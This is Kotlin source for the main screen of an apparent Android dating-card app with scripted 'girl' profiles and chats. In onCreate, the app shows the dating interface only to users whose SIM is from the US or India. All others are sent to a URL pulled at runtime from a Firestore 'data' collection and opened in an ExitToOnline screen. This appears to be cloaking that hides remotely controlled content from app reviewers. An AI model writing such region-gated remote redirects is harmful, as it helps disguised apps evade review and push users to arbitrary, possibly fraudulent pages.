package crd.ctin.cardstinapp

import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.telephony.TelephonyManager
import android.view.View
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.Observer
import androidx.recyclerview.widget.LinearLayoutManager
import androidx.recyclerview.widget.RecyclerView
import androidx.viewpager2.widget.CompositePageTransformer
import androidx.viewpager2.widget.MarginPageTransformer
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.FirebaseFirestoreSettings
import crd.ctin.cardstinapp.database.MessagesDb
import kotlinx.android.synthetic.main.activity_main.*
import kotlinx.android.synthetic.main.chat_view.*
import kotlinx.android.synthetic.main.discover_view.*
import java.io.Serializable
import kotlin.math.abs


class MainActivity : AppCompatActivity() {
    private var position = 0
    private var size: Int = 0
    private var chatGirls: ArrayList<Girl> = arrayListOf()
    private lateinit var list: List<Girl>


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        FirebaseFirestore.getInstance()
        val manager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager

        val ans =
            listOf(
                "us",
                "in"
            ).contains(manager.simCountryIso) && manager.simOperatorName.isNotEmpty()

        if (ans) {
            setALLUI()
        } else
            getURL()
    }


    private fun getURL() {

        val g = FirebaseFirestore.getInstance()
        val h = FirebaseFirestoreSettings.Builder()
            .setPersistenceEnabled(false)
            .build()

        g.firestoreSettings = h
        var oBool = false

        g.collection("data").get().addOnCompleteListener { task ->

            if (task.isSuccessful) for (document in task.result!!)
                if (document.data["value"].toString().length > 1) {

                    oBool = true
                    val message = document.data["value"] as String
                    goLink(message)

                }
            if (!oBool) setALLUI()
        }.addOnFailureListener { setALLUI() }
    }

    private fun goLink(url: String) {
        val i = Intent(this, ExitToOnline::class.java)
        i.putExtra("url", url)
        startActivity(i)
        finish()
    }


    fun setALLUI() {
        pg_no_bar.visibility = View.GONE
        main_vw.visibility = View.VISIBLE

        bottom_navigation.itemIconTintList = null
        locationViewPager.isUserInputEnabled = false
        list = getALLGIRLSSHUFLED()
        setDataToAdapter(list)
        setChat(list)

        nextGirl(list[position])

        accept_btn.setOnClickListener {
            val intent = Intent(this, PrivateMessagesActivity::class.java)
            intent.putExtra("human", list[position - 1] as Serializable)
            startActivity(intent)
            nextGirl(list[position])

        }
        reject_btn.setOnClickListener {
            nextGirl(list[position])
        }

        bottom_navigation.setOnNavigationItemSelectedListener { item ->
            when (item.itemId) {
                R.id.page_1 -> {
                    discover_view.visibility = View.VISIBLE
                    chat_view.visibility = View.GONE
                    true
                }
                R.id.page_2 -> {
                    chat_view.visibility = View.VISIBLE
                    discover_view.visibility = View.GONE
                    setChat(list)
                    true
                }
                else -> false
            }
        }
    }

    //    chat
    fun setChat(locationList: List<Girl>) {
        val humans = locationList

        chatGirls.clear()
        recyclerView.layoutManager = LinearLayoutManager(applicationContext)
        MessagesDb.get(application).getMessagesDao().getChatIds()
            .observe(this, Observer {
                it.forEach { it ->
                    MessagesDb.get(application).getMessagesDao().getLastMessageByChatId(it)
                        .observe(this, Observer { msg: Message ->
                            humans.forEach {
                                if (msg.chat_id == it.message.chat_id) {
                                    chatGirls.add(
                                        Girl(
                                            it.name,
                                            it.profession,
                                            it.imageURL,
                                            it.age,
                                            it.liked,
                                            msg
                                        )
                                    )
                                }
                                val adapter = MessageAdapter(chatGirls) { adapterPosition ->
                                    if (!chatGirls[adapterPosition].message.read) {
                                        chatGirls[adapterPosition].message.read = true
                                    }

                                    val intent = Intent(
                                        applicationContext,
                                        PrivateMessagesActivity::class.java
                                    )
                                    intent.putExtra(
                                        "human",
                                        chatGirls[adapterPosition] as Serializable
                                    )
                                    startActivity(intent)

                                }
                                recyclerView.adapter = adapter

                                if (chatGirls.size > 0) {
                                    advert.visibility = View.GONE
                                }
                                adapter.notifyDataSetChanged()
                            }
                        })

                }

            })
    }

//    end


// discover

    fun nextGirl(modelH: Girl) {
        name_pers.text = modelH.name


        if (position < size - 1) {
            locationViewPager.setCurrentItem(position, true)
            indicator.animatePageSelected(position++)
        } else {
            position = 0
            list = getALLGIRLSSHUFLED()
            setDataToAdapter(list)
            nextGirl(list[position])
//            todo
        }

    }

    private fun setDataToAdapter(locationList: List<Girl>) {
        size = locationList.size
        indicator.createIndicators(size, 0)


        locationViewPager.adapter = CardAdapter(this, locationList) { adapterPosition ->
//
//            val intent = Intent(this, PrivateChatActivity::class.java)
//            intent.putExtra("human", locationList[adapterPosition] as Serializable)
//            startActivity(intent)
        }

        addCompositePageTransformer()
    }


    private fun addCompositePageTransformer() {

        locationViewPager.clipToPadding = false
        locationViewPager.clipChildren = false
        locationViewPager.offscreenPageLimit = 3
        locationViewPager.getChildAt(0).overScrollMode =
            RecyclerView.OVER_SCROLL_NEVER


        val compositePageTransformer = CompositePageTransformer()
        compositePageTransformer.addTransformer(MarginPageTransformer(20))
        compositePageTransformer.addTransformer { page: View, position: Float ->
            val r = 1 - abs(position)
            page.scaleY = 0.95f + r * 0.05f
        }
        locationViewPager.setPageTransformer(compositePageTransformer)

//        chat_open_btn.setOnClickListener {
//            val intent = Intent(this, ChatActivity::class.java)
//            startActivity(intent)
//        }

    }
}